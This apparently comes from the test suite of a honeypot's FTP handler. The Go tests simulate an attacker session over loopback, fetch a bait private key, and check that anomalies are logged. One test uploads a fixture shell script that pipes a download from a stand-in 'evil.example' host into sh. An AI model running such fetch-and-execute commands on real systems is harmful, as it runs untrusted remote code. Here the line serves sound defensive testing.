package handler

import (
	"bufio"
	"context"
	"io"
	"net"
	"strings"
	"testing"
	"time"

	"github.com/rom/tarpit-honeypot/internal/config"
	"github.com/rom/tarpit-honeypot/internal/identity"
	"github.com/rom/tarpit-honeypot/internal/jitter"
)

// ftpControl drives the ftp handler over a real loopback socket (PASV needs a
// real listener, which net.Pipe can't provide) and returns the client control
// connection plus a wait() for the captured Result.
func ftpControl(t *testing.T) (ctrl net.Conn, wait func() Result) {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	accepted := make(chan net.Conn, 1)
	go func() { c, _ := ln.Accept(); accepted <- c }()
	client, err := net.Dial("tcp", ln.Addr().String())
	if err != nil {
		t.Fatal(err)
	}
	server := <-accepted
	_ = ln.Close()

	resC := make(chan Result, 1)
	go func() {
		h := &ftp{jit: jitter.New(0, 0), id: identity.New("ftp-test")}
		r, _ := h.Handle(context.Background(), server,
			config.Listener{Handler: "ftp", ReadTimeout: 5 * time.Second})
		resC <- r
	}()
	t.Cleanup(func() { _ = client.Close(); _ = server.Close() })
	return client, func() Result {
		select {
		case r := <-resC:
			return r
		case <-time.After(5 * time.Second):
			t.Fatal("ftp handler did not return")
			return Result{}
		}
	}
}

func TestFTPChangeDirAndList(t *testing.T) {
	ctrl, wait := ftpControl(t)
	br := bufio.NewReader(ctrl)
	reply := func() string { l, _ := br.ReadString('\n'); return l }
	send := func(s string) { _, _ = ctrl.Write([]byte(s + "\r\n")) }

	reply() // 220 banner
	send("USER anonymous")
	reply() // 331
	send("PASS x")
	reply() // 530 (first PASS fails)
	send("PASS x")
	reply() // 230 logged in

	// CWD updates a coherent working directory that PWD reflects.
	send("CWD backup")
	reply() // 250
	send("PWD")
	if pwd := reply(); !strings.Contains(pwd, "/backup") {
		t.Errorf("PWD after CWD backup = %q; want it to contain /backup", pwd)
	}
	send("CDUP")
	reply()
	send("PWD")
	if pwd := reply(); !strings.Contains(pwd, `"/"`) {
		t.Errorf("PWD after CDUP = %q; want /", pwd)
	}

	// PASV + LIST returns a real directory listing over the data channel.
	send("PASV")
	dconn, err := net.Dial("tcp", parsePASV(t, reply()))
	if err != nil {
		t.Fatalf("data dial: %v", err)
	}
	send("LIST")
	reply() // 150
	listing, _ := io.ReadAll(dconn)
	_ = dconn.Close()
	reply() // 226
	if !strings.Contains(string(listing), "README.txt") {
		t.Errorf("LIST did not return a real listing: %q", listing)
	}

	// RETR of a bait file transfers content and raises honeyfile-download.
	send("PASV")
	dconn, err = net.Dial("tcp", parsePASV(t, reply()))
	if err != nil {
		t.Fatalf("data dial: %v", err)
	}
	send("RETR id_rsa")
	reply() // 150
	body, _ := io.ReadAll(dconn)
	_ = dconn.Close()
	reply() // 226
	if !strings.Contains(string(body), "PRIVATE KEY") {
		t.Errorf("RETR id_rsa body = %q; want a key", body)
	}

	send("QUIT")
	reply()
	_ = ctrl.Close()

	res := wait()
	anoms, _ := res.Meta["anomalies"].([]string)
	for _, want := range []string{"ftp-listing", "ftp-download-attempt", "honeyfile-download"} {
		if !containsStr(anoms, want) {
			t.Errorf("missing anomaly %q; got %v", want, anoms)
		}
	}
}

func TestFTPCapturesUploadBody(t *testing.T) {
	ctrl, wait := ftpControl(t)
	br := bufio.NewReader(ctrl)
	reply := func() string { l, _ := br.ReadString('\n'); return l }
	send := func(s string) { _, _ = ctrl.Write([]byte(s + "\r\n")) }

	reply() // 220
	send("USER anonymous")
	reply()
	send("PASS x")
	reply()
	send("PASS x")
	reply()

	send("PASV")
	dconn, err := net.Dial("tcp", parsePASV(t, reply()))
	if err != nil {
		t.Fatalf("data dial: %v", err)
	}
	send("STOR evil.sh")
	reply() // 150
	payload := "#!/bin/sh\ncurl http://evil.example/x | sh\n"
	_, _ = dconn.Write([]byte(payload))
	_ = dconn.Close()
	reply() // 226
	send("QUIT")
	reply()
	_ = ctrl.Close()

	res := wait()
	if sz, _ := res.Meta["ftp_upload_size"].(int); sz != len(payload) {
		t.Errorf("ftp_upload_size = %v; want %d", res.Meta["ftp_upload_size"], len(payload))
	}
	if prev, _ := res.Meta["ftp_upload_preview"].(string); !strings.Contains(prev, "curl http://evil") {
		t.Errorf("upload preview not captured: %q", prev)
	}
	anoms, _ := res.Meta["anomalies"].([]string)
	if !containsStr(anoms, "ftp-upload-attempt") {
		t.Errorf("missing ftp-upload-attempt; got %v", anoms)
	}
}
